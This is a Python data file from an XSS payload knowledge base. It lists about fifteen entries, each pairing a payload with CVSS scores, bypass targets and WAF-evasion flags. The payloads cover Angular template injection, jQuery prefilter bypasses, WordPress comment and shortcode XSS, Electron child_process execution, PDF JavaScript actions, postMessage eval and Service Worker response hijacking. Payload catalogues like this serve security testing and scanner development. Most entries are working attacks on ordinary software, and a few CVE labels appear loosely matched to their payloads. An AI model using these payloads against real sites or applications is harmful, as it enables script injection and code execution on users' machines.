#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

1-Day XSS Payloads - Part 2
Framework-specific CVEs (Angular, React, Vue), WordPress, Electron, PDF XSS, postMessage vulnerabilities, and Service Worker vulnerabilities.
"""

from ..models import PayloadEntry


BRS_KB_1DAY_CVE_PAYLOADS_PART2 = {
    # ============================================================
    # FRAMEWORK-SPECIFIC CVEs
    # ============================================================
    # Angular CVE-2020-7676 - prototype pollution
    "cve-2020-7676-angular": PayloadEntry(
        payload='{{constructor.constructor("alert(1)")()}}',
        contexts=["template", "angular"],
        severity="critical",
        cvss_score=9.0,
        description="CVE-2020-7676: Angular prototype pollution",
        tags=["cve", "angular", "prototype", "2020"],
        bypasses=["angular_sandbox"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # React dangerouslySetInnerHTML pattern
    "react-dangerously-1": PayloadEntry(
        payload='{"__html":"<img src=x onerror=alert(1)>"}',
        contexts=["json", "react"],
        severity="high",
        cvss_score=8.0,
        description="React dangerouslySetInnerHTML injection",
        tags=["react", "innerHTML", "json"],
        bypasses=["react_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # Vue CVE-2024-6783 - ReDoS leading to XSS
    "cve-2024-6783-vue": PayloadEntry(
        payload='{{("a]".repeat(1000000))}}',
        contexts=["template", "vue"],
        severity="high",
        cvss_score=7.5,
        description="CVE-2024-6783: Vue.js ReDoS pattern",
        tags=["cve", "vue", "redos", "2024"],
        bypasses=["regex_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # jQuery CVE-2020-11022 - htmlPrefilter bypass
    "cve-2020-11022-jquery": PayloadEntry(
        payload="<option><style></option></select><img src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="CVE-2020-11022: jQuery htmlPrefilter bypass",
        tags=["cve", "jquery", "prefilter", "2020"],
        bypasses=["jquery_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # jQuery CVE-2020-11023 - DOM manipulation
    "cve-2020-11023-jquery": PayloadEntry(
        payload='<img alt="<img src=x onerror=alert(1)>"/>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="CVE-2020-11023: jQuery DOM manipulation XSS",
        tags=["cve", "jquery", "dom", "2020"],
        bypasses=["jquery_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # WORDPRESS SPECIFIC
    # ============================================================
    "wordpress-stored-xss-1": PayloadEntry(
        payload='<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="WordPress stored XSS via comment",
        tags=["wordpress", "comment", "stored"],
        bypasses=["wordpress_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "wordpress-shortcode-xss": PayloadEntry(
        payload="[caption]<img src=x onerror=alert(1)>[/caption]",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="WordPress shortcode XSS",
        tags=["wordpress", "shortcode"],
        bypasses=["shortcode_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # ELECTRON SPECIFIC CVEs
    # ============================================================
    # Electron nodeIntegration bypass
    "electron-node-integration": PayloadEntry(
        payload="require('child_process').exec('calc')",
        contexts=["javascript", "electron"],
        severity="critical",
        cvss_score=10.0,
        description="Electron nodeIntegration enabled RCE",
        tags=["electron", "node", "rce"],
        bypasses=["electron_sandbox"],
        waf_evasion=True,
        browser_support=["electron"],
        reliability="high",
    ),
    # Electron contextIsolation bypass
    "electron-context-isolation": PayloadEntry(
        payload="window.top.require('child_process').exec('id')",
        contexts=["javascript", "electron"],
        severity="critical",
        cvss_score=10.0,
        description="Electron contextIsolation bypass",
        tags=["electron", "context", "rce"],
        bypasses=["electron_sandbox"],
        waf_evasion=True,
        browser_support=["electron"],
        reliability="medium",
    ),
    # Electron preload script bypass
    "electron-preload-bypass": PayloadEntry(
        payload="window.__proto__.require=require;window.require('child_process')",
        contexts=["javascript", "electron"],
        severity="critical",
        cvss_score=10.0,
        description="Electron preload script prototype pollution",
        tags=["electron", "preload", "prototype"],
        bypasses=["electron_sandbox"],
        waf_evasion=True,
        browser_support=["electron"],
        reliability="medium",
    ),
    # ============================================================
    # PDF XSS CVEs
    # ============================================================
    "pdf-xss-acroform": PayloadEntry(
        payload="%PDF-1.4 1 0 obj<</AcroForm<</XFA[(preamble)(x%3Cscript%3Ealert(1)%3C/script%3E)]>>>",
        contexts=["pdf"],
        severity="high",
        cvss_score=7.5,
        description="PDF XSS via AcroForm XFA",
        tags=["pdf", "acroform", "xfa"],
        bypasses=["pdf_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="medium",
    ),
    "pdf-xss-openaction": PayloadEntry(
        payload="/Type/Catalog/OpenAction<</S/JavaScript/JS(app.alert(1))>>",
        contexts=["pdf"],
        severity="high",
        cvss_score=7.5,
        description="PDF XSS via OpenAction JavaScript",
        tags=["pdf", "openaction", "javascript"],
        bypasses=["pdf_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # POSTMESSAGE VULNERABILITIES
    # ============================================================
    "postmessage-no-origin-check": PayloadEntry(
        payload="window.postMessage('<img src=x onerror=alert(1)>','*')",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="postMessage without origin validation",
        tags=["postmessage", "origin"],
        bypasses=["origin_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "postmessage-eval-data": PayloadEntry(
        payload="window.onmessage=e=>eval(e.data)",
        contexts=["javascript"],
        severity="critical",
        cvss_score=9.0,
        description="postMessage with eval on data",
        tags=["postmessage", "eval"],
        bypasses=["eval_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SERVICE WORKER VULNERABILITIES
    # ============================================================
    "sw-cache-poisoning": PayloadEntry(
        payload="self.addEventListener('fetch',e=>e.respondWith(new Response('<script>alert(1)</script>',{headers:{'Content-Type':'text/html'}})))",
        contexts=["javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Service Worker cache poisoning",
        tags=["serviceworker", "cache"],
        bypasses=["sw_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
}
